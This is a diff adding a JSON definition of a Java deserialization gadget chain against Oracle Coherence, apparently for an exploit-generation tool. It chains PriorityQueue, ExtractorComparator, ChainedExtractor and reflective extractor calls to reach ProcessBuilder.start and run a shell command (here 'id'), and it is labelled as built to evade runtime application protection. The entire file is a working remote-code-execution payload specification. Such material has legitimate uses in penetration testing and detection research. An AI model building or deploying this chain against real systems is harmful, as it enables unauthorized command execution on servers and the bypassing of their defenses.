@@ -1,0 +1,45 @@
+{
+  "chain_type": "Coherence ProcessBuilder sink — RASP evasion",
+  "root_class": "java.util.PriorityQueue",
+  "root_trigger": "readObject→heapify→comparator.compare→ExtractorComparator.compare→extract",
+  "links": [
+    {
+      "class": "com.tangosol.util.comparator.ExtractorComparator",
+      "field_overrides": {
+        "m_extractor": {"$ref": "link:1"}
+      }
+    },
+    {
+      "class": "com.tangosol.util.extractor.ChainedExtractor",
+      "field_overrides": {
+        "m_aExtractor": [
+          {"$ref": "link:2"},
+          {"$ref": "link:3"},
+          {"$ref": "link:4"}
+        ]
+      }
+    },
+    {
+      "class": "com.tangosol.util.extractor.ReflectionExtractor",
+      "field_overrides": {
+        "m_sMethod": "getConstructor",
+        "m_aoParam": [["[Ljava.lang.String;"]]
+      }
+    },
+    {
+      "class": "com.tangosol.util.extractor.ReflectionExtractor",
+      "field_overrides": {
+        "m_sMethod": "newInstance",
+        "m_aoParam": [[["id"]]]
+      }
+    },
+    {
+      "class": "com.tangosol.util.extractor.ReflectionExtractor",
+      "field_overrides": {
+        "m_sMethod": "start",
+        "m_aoParam": []
+      }
+    }
+  ],
+  "sink_method": "ProcessBuilder.start"
+}
